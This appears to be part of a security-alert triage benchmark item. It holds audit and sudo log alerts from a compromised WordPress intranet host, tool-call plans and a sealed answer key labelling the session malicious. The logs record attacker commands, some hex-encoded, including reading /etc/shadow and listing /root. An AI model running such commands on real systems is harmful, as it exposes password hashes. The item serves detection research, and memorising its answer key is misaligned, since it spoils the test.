+    {
+      "event_id": "ait-sess-0020-fefee643",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1644309417.304:2919): pid=28346 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=636174202F6574632F736861646F77 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0021-47b9c4dd",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1644309417.304:2919): pid=28346 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=636174202F6574632F736861646F77 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0022-b8ce3e02",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1644309417.308:2920): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0023-d8487543",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1644309417.308:2920): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0024-a8b268d2",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309417.308:2921): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0025-d60bd760",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1644309417.324:2922): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0026-38e071e7",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1644309417.324:2923): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0027-4a789fbd",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:59 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/bin/ls -laR /root/",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0028-f4411251",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:59 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0029-d547d4c7",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:59 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0030-38111fd8",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1644309419.748:2924): pid=28348 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C6152202F726F6F742F terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0031-a8093361",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1644309419.748:2924): pid=28348 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C6152202F726F6F742F terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0032-26c7297d",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1644309419.748:2925): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0033-31e664a7",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1644309419.748:2925): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0034-55ca1290",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309419.748:2926): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0035-f7e137f0",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1644309419.972:2927): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0036-dd4be10e",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:59Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1644309419.972:2928): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0037-58782062",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:37:08 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/bin/ls -l /home",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0038-d7444a0b",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:37:08 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0039-8613c113",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:37:08 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0040-303fde6d",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1644309428.599:2929): pid=28352 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C202F686F6D65 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0041-16829cef",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1644309428.599:2929): pid=28352 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C202F686F6D65 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0042-97dc3c53",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1644309428.599:2930): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0043-8f9acc07",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1644309428.599:2930): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0044-459b14d9",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309428.599:2931): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0045-743aafbf",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1644309428.607:2932): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0046-8d340638",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:37:08Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1644309428.611:2933): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "harrison"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "harrison"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on harrison (46 alerts; detectors: AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter combination in Audit logs., AMiner: New cred_disp parameter ",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "harrison"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "harrison"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on harrison (46 alerts; detectors: AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter combination in Audit logs., AMiner: New cred_disp parameter ",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "ATTEST-AIT-ADS",
+    "scenario": "harrison/harrison/session-0107",
+    "answer": "malicious",
+    "accept": [
+      "malicious"
+    ],
+    "grading": "exact_ci",
+    "label": "malicious",
+    "is_true_positive": true,
+    "attack_stages": [
+      "privilege_escalation",
+      "reverse_shell"
+    ],
+    "session": {
+      "gap_sec": 900,
+      "max_sec": 3600,
+      "alert_count": 46,
+      "kept_alerts": 46
+    },
+    "sealed": true
+  }
+}
